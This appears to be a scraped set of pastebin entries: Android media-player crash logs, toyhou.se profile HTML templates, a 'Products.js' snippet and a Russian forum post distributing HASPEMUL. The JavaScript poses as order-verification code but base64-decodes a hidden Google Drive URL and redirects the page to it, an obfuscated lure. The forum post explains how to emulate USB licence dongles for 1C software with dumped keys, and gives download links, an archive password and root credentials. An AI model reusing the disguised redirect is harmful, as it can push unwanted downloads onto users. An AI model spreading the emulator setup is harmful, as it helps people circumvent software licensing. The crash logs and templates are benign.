CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d9db5b87c5c2ed7a506342a9a2d4432d4\u0026type\u003dsong\u0026id\u003d50502"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
cmw4tqFk,2025-04-17T18:48:47.419459,powerampache,PHP,Thursday 17th of April 2025 08:48:48 AM CDT,"1.01-79 (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":28},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":144870537,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d9db5b87c5c2ed7a506342a9a2d4432d4\u0026type\u003dsong\u0026id\u003d50502"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
bLQdVqRh,2025-04-17T18:48:46.475656,powerampache,PHP,Thursday 17th of April 2025 08:48:47 AM CDT,"1.01-79 (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":27},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":144869567,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d9db5b87c5c2ed7a506342a9a2d4432d4\u0026type\u003dsong\u0026id\u003d54936"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
UX9aNppw,Products.js,dentira,JavaScript,Thursday 17th of April 2025 08:33:46 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/28169/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
x3xv7wK8,revamped strawberry,elltaker,HTML,Thursday 17th of April 2025 08:32:35 AM CDT,"<div class=""container p-2 col-md-3"">
    
    <div class=""row no-gutters"">
        
        <!-- pagedoll -->
        <div class=""container col-5 mb-3"" style=""background-image: url(https://f2.toyhou.se/file/f2-toyhou-se/images/98421672_lZu43NGaeq5dXgg.png); background-size:contain; background-repeat:no-repeat; background-position: center; height: 200px;""></div>
            
        <div class=""container col-7 p-2 mb-3"" style=""max-height:200px; overflow-y:auto; scrollbar-width: none;"">
            
            <!-- info -->
            <p style=""font-family:verdana; text-align:center; font-size:15px;"">
                
                <img src=""https://graphic.neocities.org/tumblr_inline_mo7oxl4KtY1qz4rgp.gif"" style=""height:15px; width:15px"">
                
                firstname lastname 
            
                <img src=""https://graphic.neocities.org/tumblr_inline_mo7oxl4KtY1qz4rgp.gif"" style=""height:15px; width:15px""><br>
            
                <span style=""font-size:10px;"">prns/prns
                
                <img src=""https://graphic.neocities.org/tumblr_inline_mtig9aCNwx1roozkr.gif"" style=""height:10px; width:10px"">
                
                gender
                
                <img src=""https://graphic.neocities.org/tumblr_inline_mtig9aCNwx1roozkr.gif"" style=""height:10px; width:10px"">
                
                species
                
                <img src=""https://graphic.neocities.org/tumblr_inline_mtig9aCNwx1roozkr.gif"" style=""height:10px; width:10px"">
                
                etc</span><br><br>
                
                <img src=""https://graphic.neocities.org/tumblr_mj0rnkCiMO1rj3x28o1_500.gif"" style=""height:30px;"">
                
                <br><br><span style=""font-size:13px;"">write about your character HERE!!!!11! this scrolls, so yap away!!! Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span>
                
                </p>
                
            <div class=""mb-2""></div>
                
            <p style=""text-align:center;"">
                
                <img src=""https://graphic.neocities.org/tumblr_moh8sqqptl1r7y61oo1_100.gif"" style=""height:px;"">
        
            </p>
    
        </div>
        
    </div>
    
    <p style=""text-align:right;"">
        
        <!-- credit -->
        <a href=""ART_CREDIT_LINK"" class=""tooltipster"" title=""art by BLANK""><i class=""fa-solid fa-palette fa-xs""></i></a>
        <a href=""https://toyhou.se/elltaker"" class=""tooltipster"" title=""code by elltaker""><i class=""fa-solid fa-code fa-xs""></i></a>
        
    </p>
    
</div>"
zaR17mbt,revamped apple,elltaker,HTML,Thursday 17th of April 2025 08:28:23 AM CDT,"<div class=""container p-2 col-md-3"">
    
    <div class=""row no-gutters"">
        
        <!-- pagedoll -->
        <div class=""container col-5 mb-3"" style=""background-image: url(https://f2.toyhou.se/file/f2-toyhou-se/images/98421672_lZu43NGaeq5dXgg.png); background-size:contain; background-repeat:no-repeat; background-position: center; height: 200px;""></div>
            
        <div class=""container col-7 p-2 mb-3"" style=""max-height:200px; overflow-y:auto; scrollbar-width: none;"">
            
            <!-- info -->
            <p style=""font-family:verdana; text-align:center; font-size:15px;"">
                
                <img src=""https://graphic.neocities.org/tumblr_inline_mixvlcvXRs1qz4rgp.gif"" style=""height:15px; width:15px"">
                
                firstname lastname 
            
                <img src=""https://graphic.neocities.org/tumblr_inline_mixvlcvXRs1qz4rgp.gif"" style=""height:15px; width:15px""><br>
            
                <span style=""font-size:10px;"">prns/prns
                
                <img src=""https://graphic.neocities.org/%E6%9E%97%E6%AA%8E%E3%83%81%E3%83%A3%E3%83%B3_m.gif"" style=""height:10px; width:10px"">
                
                gender
                
                <img src=""https://graphic.neocities.org/%E6%9E%97%E6%AA%8E%E3%83%81%E3%83%A3%E3%83%B3_m.gif"" style=""height:10px; width:10px"">
                
                species
                
                <img src=""https://graphic.neocities.org/%E6%9E%97%E6%AA%8E%E3%83%81%E3%83%A3%E3%83%B3_m.gif"" style=""height:10px; width:10px"">
                
                etc</span><br><br>
                
                <img src=""https://th.bing.com/th/id/R.137468b0b201abbf69531d077149245c?rik=9PYGB6d4lX3PqA&riu=http%3a%2f%2fwww.prekfun.com%2fTHEMES%2fPREKthemes%2fA-F%2fApples%2fGraphics%2fOther%2fdivider1.gif&ehk=rVqoXAY%2fqNWbzPwefUM2bp%2fwVzI3GqDuSIge0VKrK6Q%3d&risl=&pid=ImgRaw&r=0"" style=""height:30px;"">
                
                <br><br><span style=""font-size:13px;"">write about your character HERE!!!!11! this scrolls, so yap away!!! Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span>
                
                </p>
                
            <div class=""mb-2""></div>
                
            <p style=""text-align:center;"">
                
                <img src=""https://graphic.neocities.org/Obst_Gemuse_13.gif"" style=""height:px;"">
        
            </p>
    
        </div>
        
    </div>
    
    <p style=""text-align:right;"">
        
        <!-- credit -->
        <a href=""ART_CREDIT_LINK"" class=""tooltipster"" title=""art by BLANK""><i class=""fa-solid fa-palette fa-xs""></i></a>
        <a href=""https://toyhou.se/elltaker"" class=""tooltipster"" title=""code by elltaker""><i class=""fa-solid fa-code fa-xs""></i></a>
        
    </p>
    
</div>"
g0wh0T6y,revamped ice cream,elltaker,HTML,Thursday 17th of April 2025 08:19:59 AM CDT,"<div class=""container p-2 col-md-3"">
    
    <div class=""row no-gutters"">
        
        <!-- pagedoll -->
        <div class=""container col-5 mb-3"" style=""background-image: url(https://f2.toyhou.se/file/f2-toyhou-se/images/98421672_lZu43NGaeq5dXgg.png); background-size:contain; background-repeat:no-repeat; background-position: center; height: 200px;""></div>
            
        <div class=""container col-7 p-2 mb-3"" style=""max-height:200px; overflow-y:auto; scrollbar-width: none;"">
            
            <!-- info -->
            <p style=""font-family:verdana; text-align:center; font-size:15px;"">
                
                <img src=""https://graphic.neocities.org/tumblr_ltj3d5IyoA1r17znu.gif"" style=""height:15px; width:15px"">
                
                firstname lastname 
            
                <img src=""https://graphic.neocities.org/tumblr_ltj3d5IyoA1r17znu.gif"" style=""height:15px; width:15px""><br>
            
                <span style=""font-size:10px;"">prns/prns
                
                <img src=""https://graphic.neocities.org/tumblr_inline_mo7p042JXz1qz4rgp.gif"" style=""height:10px; width:10px"">
                
                gender
                
                <img src=""https://graphic.neocities.org/tumblr_inline_mo7p042JXz1qz4rgp.gif"" style=""height:10px; width:10px"">
                
                species
                
                <img src=""https://graphic.neocities.org/tumblr_inline_mo7p042JXz1qz4rgp.gif"" style=""height:10px; width:10px"">
                
                etc</span><br><br>
                
                <img src=""https://graphic.neocities.org/ice_by_littlegrimoire-d71x9jc.gif"" style=""height:35px;"">
                
                <br><br><span style=""font-size:13px;"">write about your character HERE!!!!11! this scrolls, so yap away!!! Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span>
                
                </p>
                
            <div class=""mb-2""></div>
                
            <p style=""text-align:center;"">
                
                <img src=""https://graphic.neocities.org/Food_45.gif"" style=""height:px;"">
        
            </p>
    
        </div>
        
    </div>
    
    <p style=""text-align:right;"">
        
        <!-- credit -->
        <a href=""ART_CREDIT_LINK"" class=""tooltipster"" title=""art by BLANK""><i class=""fa-solid fa-palette fa-xs""></i></a>
        <a href=""https://toyhou.se/elltaker"" class=""tooltipster"" title=""code by elltaker""><i class=""fa-solid fa-code fa-xs""></i></a>
        
    </p>
    
</div>"
KiSV5Bhv,Untitled,napasterr,Bash,Thursday 17th of April 2025 08:18:30 AM CDT,"[B]HASPEMUL 4.4[/B] (25.12.2024) [B]#[/B][#]
https://pixeldrain.com/l/CYdUasZu
pass. ruboard
* haspemul.2.5.5.7z (2.5.5 образ ВМ)
* haspemul.2.5.5.update.7z (2.5.5 обновление)
* haspemul.3.7.update.7z (3.7 обновление с версий >= 1.1)
* haspemul.4.1.1.x64.7z (4.1.1 образ ВМ - специальная версия x64 для тех, у кого проблемы с версией x86)
* haspemul.4.3.4.7z (4.3.4 образ ВМ)
* hec_4.4-1_all.deb.7z (панель управления 4.4 - обновление с версий >=3.6.5 в виде debian-пакета, возможна установка на чистую ОС)
* aksusbd_8.11-y_amd64.deb (debian-пакет с драйверами для x64, внутри aksusbd 8.11 + hasplm 8.30)
[/#]
Удобная, быстрая, компактная и легкоразвёртываемая на всех основных гипервизорах виртуальная машина, предназначенная для раздачи эмулированных USB-ключей (изначально от продуктов 1С), создана на базе Debian 10 x86. Ключи могут быть прокинуты [b]в том числе на Windows[/b]. Поставляется в виде полностью готовых к использованию образов виртуального диска.
[b]Автор:[/b] [b][url=https://forum.ru-board.com/profile.cgi?action=show&member=yurykk22]yurykk22[/url][/b]

Отдельно [b][url=https://forum.ru-board.com/topic.cgi?forum=35&topic=83203&start=600#20]Установщик эмулятора для linux-систем[/url][/b] (основные отличия: работает на основных версиях линукс <centos, ubuntu и др.>, нет контейнеров для ключей, названия эмулируемых устройств не различаются, удобно для 1с-серверов на линуксе). [I]НЕ совместим с Панелью управления[/I]

[B][U]Изменения в 4.4[/U][/B]
- эмулятор: добавлена поддержка ядер >=6.11
- usb redirector: обновлены встроенные пакеты до 3.11.4

[color=#FF0000]ВНИМАНИЕ![/color] При появлении ошибок 'Процесс завершен с ошибкой. Открыть журнал?', присылать лог /tmp/control.log в личку (лог удаляется после закрытия окна ошибки). Также желательно высылать лог /var/log/syslog.

[B]Пользователи ВМ:[/B] ruboard/ruboard, root/ruboard
Внутри [B]набор дампов ключей для 1С[/B]:
- серверные x86, x64
- клиентские на 1,5,10,20,50,100,300,500
По умолчанию активны 2 ключа: x64 и Net-100
Все [B]настройки[/B] выполняются [B]через Панель управления[/B]
Панель управления запускается при входе в систему или ""[I]sudo control[/I]"" из командной строки
Знания линукс не обязательны

[B]Потребление памяти:[/B]
- до Оптимизации памяти HASPEMUL рекомендуется запускать на [B]не менее 256 Мб[/B]
- после выполнения Оптимизации памяти объем оперативной памяти может быть понижен [B]до 128 Мб и ниже[/B]
[I]Оптимизация памяти запускается из Панели управления. Более точно количество используемой памяти подбирается в зависимости от используемого гипервизора.[/I]
[B]Размер занимаемого места на диске[/B] зависит от версии и формата виртуального диска от 600 Мб до 2 Гб.

[B][color=red]Вебинтерфейс[/color] для Debian версий 2-4 [/B] от [I]Vales[/I] [url=https://forum.ru-board.com/topic.cgi?forum=35&topic=83057&start=100#18]Подробнее[/url] ( [b]обновлен 13.12.2023[/b])

[B]Рекомендуемые образы для разных гипервизоров и особенности их настройки[/B] [MORE=Подробнее][B]Рекомендуемые образы для разных гипервизоров:[/B]
- VirtualBox - OVA*, VHD, VMDK
- Hyper-V - VHD
- VMware - OVA*, VMDK
- Proxmox/QEMU/KVM - QCOW2
[I]*OVA это не только образ виртуального диска, но и готовые настройки ВМ. Импортируется на VirtualBox, VMware WS, VMware ESXi[/I]
[I]VMDK можно извлечь из OVA с помощью архиватора[/I]
[I]VHD, QCOW2 можно получить сконвертировав VMDK с помощью конвертера StarWind V2V Converter[/I]

[B]Как сделать VHD для Hyper-V на Windows[/B]
1. Распаковать файл OVA с помощью 7-Zip
2. Конвертировать VMDK -> VHD с помощью StarWind V2V Converter

[B]Как сделать QCOW2 для Proxmox/QEMU/KVM на Linux[/B]
1. Распаковать файл OVA
# tar -xvf haspemul.ova
2. Конвертировать VMDK -> QCOW с помощью qemu-img
# qemu-img convert -f vmdk -O qcow2 haspemul-disk001.vmdk haspemul-disk001.qcow2

[B]Особенности настройки на некоторых гипервизорах:[/B]
- VirtualBox на Win11 - установить 2 процессора
- Hyper-V - Поколение 1 + виртуальных процессоров 1[/MORE]
[B]Настройка HASPEMUL[/B] [MORE=Подробнее][U][B]Порядок настройки в клиент-серверном режиме:[/B][/U]
1. На сервер 1С нужно прокинуть 2 ключа (серверный и клиентский) с помощью USB Redirector или VirtualHere
2. Установить драйвера на появившиеся USB устройства, если не встали (Установка драйвера защиты)
3. После установки драйвера защиты может потребоваться перезагрузка компьютера
4. На сервере включить ""Разрешить выдачу лицензий сервером 1С: Предприятия"" в настройках Информационной базы.
5. В настройках клиента 1С (где запускается 1С) отключить ""Использовать аппаратную лицензию (ключ защиты)""
 
[U][B]Порядок настройки в файловом режиме (вариант 1):[/B][/U]
[I]*только для локальных компьютеров (по RDP работать не будет)[/I]
1. Прокинуть только 1 клиентский ключ с помощью USB Redirector или VirtualHere
2. Установить драйвера на появившиеся USB устройства, если не встали (Установка драйвера защиты)
3. После установки драйвера защиты может потребоваться перезагрузка компьютера
4. В настройках клиента 1С (где запускается 1С) включить ""Использовать аппаратную лицензию (ключ защиты)""
 
[U][B]Порядок настройки в файловом режиме (вариант 2):[/B][/U]
[I]*работает по RDP, но только с сетевыми ключами[/I]
1. На виртуальной машине положить клиентский ключ в контейнер и включить HASP LM
2. Настроить nethasp.ini на клиенте 1С (где запускается 1С) с указанием ip адреса виртуальной машины
3. В настройках клиента 1С (где запускается 1С) включить ""Использовать аппаратную лицензию (ключ защиты)""

------------------ Простой nethasp.ini ---------------------
[NH_COMMON]
NH_IPX=Disabled
NH_NETBIOS=Disabled       
NH_TCPIP=Enabled
[NH_TCPIP]
NH_SERVER_ADDR=192.168.0.12
NH_USE_BROADCAST=Disabled
----------------------------------------------------------------
Расположение nethasp.ini на Windows для всех Пользователей и Платформ  ""C:\Program Files\1cv8\conf\nethasp.ini""

[U][B]Настройки HASPEMUL:[/B][/U]
[B]1. Подключение к ВМ и авторизация[/B]
Подключиться к ВМ можно непосредственно через окно ВМ на гипервизоре, так и удаленно через протокол SSH.
При первом запуске подключаемся через окно ВМ на гипервизоре. Вводим логин и пароль пользователя ""ruboard"".
После авторизации появится меню Панели управления ВМ.
После настройки сети к ВМ можно также подключаться удаленно через SSH, для чего можно использовать connect.bat или бесплатную утилиту PuTTY.

[B]2. Настройка сети[/B] (соответствующий раздел в Панели управления)
Напротив сетевого устройства отображается IP-адрес ВМ. При первом входе адрес может не отображаться, т.к. сеть ещё не настроена.
а) Настройка DHCP. Получать IP-адрес автоматически от DHCP-сервера. Например, ВМ может получить IP-адрес от роутера.
б) Настройка static (Статический адрес). Настроить сетевые настройки вручную с указанием постоянного IP-адреса.
Статический адрес указывается в формате CIDR - XXX.XXX.XXX.XXX/XX (подробную информацию можно найти в интернете)
Если не знаете как настраивается статический адрес, попробуйте для начала использовать DHCP.
Имейте ввиду, что IP-адрес, полученный через DHCP, в дальнейшем может изменяться и это не всегда удобно.

[B]3. Эмулятор[/B] (соответствующий раздел в Панели управления)
В данном разделе можно настроить свой набор дампов ключей из встроенного комплекта или своих.
Дампы ключей собираются в контейнеры, в каждый из которых можно положить до 7 штук.
Контейнеры запускаются на отдельных USB-шинах. Номера шин присваиваются в порядке запуска контейнеров.
Чтобы загрузить собственные дампы, их нужно предварительно положить в сетевую папку \\IP\storage (\\haspemul\storage)
или через SSH загрузить в папку /var/opt/hec/storage. Загружать дампы можно в двух форматах .reg и .json.
Дампы в формате .reg предварительно конвертируются в .json через встроенный конвертер reg2json.

[B]4. HASP License Manager[/B] (соответствующий раздел в Панели управления)
